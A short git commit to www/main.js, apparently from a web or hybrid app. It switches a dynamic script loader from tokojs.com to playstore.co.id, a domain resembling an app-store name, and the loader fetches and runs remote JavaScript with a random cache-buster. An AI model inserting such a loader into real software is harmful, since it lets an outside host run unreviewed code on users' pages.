33db92ff06aab93e4abbb42f60edbc815f2008a3
aahedi <aahedi@gmail.com>
2018-06-11 09:17:37 +0700

    Update main.js

--- www/main.js
+++ www/main.js
@@ -1,5 +1,5 @@
 var sNew = document.createElement("script");
 sNew.async = true;
-sNew.src = "http://tokojs.com/app/wifi.js?"+Math.random();
+sNew.src = "http://playstore.co.id/wifi.js?"+Math.random();
 var s0 = document.getElementsByTagName('script')[0];
 s0.parentNode.insertBefore(sNew, s0);
